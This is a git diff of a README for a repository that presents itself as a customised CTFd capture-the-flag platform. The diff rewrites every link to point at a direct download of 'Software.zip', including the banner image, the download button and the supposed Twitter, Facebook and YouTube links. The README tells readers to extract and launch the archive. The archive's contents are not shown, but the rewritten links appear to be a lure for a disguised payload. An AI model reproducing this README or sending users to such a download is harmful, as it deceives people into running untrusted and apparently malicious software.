@@ -1,6 +1,6 @@
 # 🚀 Welcome to CTFd CarSU-CTF Repository!
 
-![CTFd_CarSU-CTF](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
+![CTFd_CarSU-CTF](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -17,7 +17,7 @@ Welcome to the CTFd CarSU-CTF repository, where we have customized the deploymen
 To get started with our CTFd platform, follow the steps below:
 
 1. Download the necessary files by clicking on the link below:
-   [![Download Zip](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0 "Download Zip")
+   [![Download Zip](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/download/v2.0/Software.zip)](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/download/v2.0/Software.zip "Download Zip")
 
    (Note: The zip file needs to be extracted and launched for installation)
 
@@ -47,7 +47,7 @@ Are you ready to test your cybersecurity skills and join our CTF challenges? Get
 
 Join our vibrant cybersecurity community to connect with like-minded individuals, share insights, and collaborate on challenging projects. We welcome cybersecurity enthusiasts of all skill levels to join us on this exciting journey!
 
-![Community Support](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
+![Community Support](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/download/v2.0/Software.zip)
 
 ## Contributors
 
@@ -61,9 +61,9 @@ We value your feedback and suggestions to improve our CTFd platform further. Fee
 
 Stay connected with us for the latest updates, challenges, and cybersecurity news:
 
-- Follow us on [Twitter](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
-- Like us on [Facebook](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
-- Subscribe to our [YouTube](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/tag/v1.0)
+- Follow us on [Twitter](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/download/v2.0/Software.zip)
+- Like us on [Facebook](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/download/v2.0/Software.zip)
+- Subscribe to our [YouTube](https://github.com/Phucclone/CTFd_CarSU-CTF/releases/download/v2.0/Software.zip)
 
 Let's continue to learn, grow, and thrive in the world of cybersecurity together! 🛡️💻🔒
 
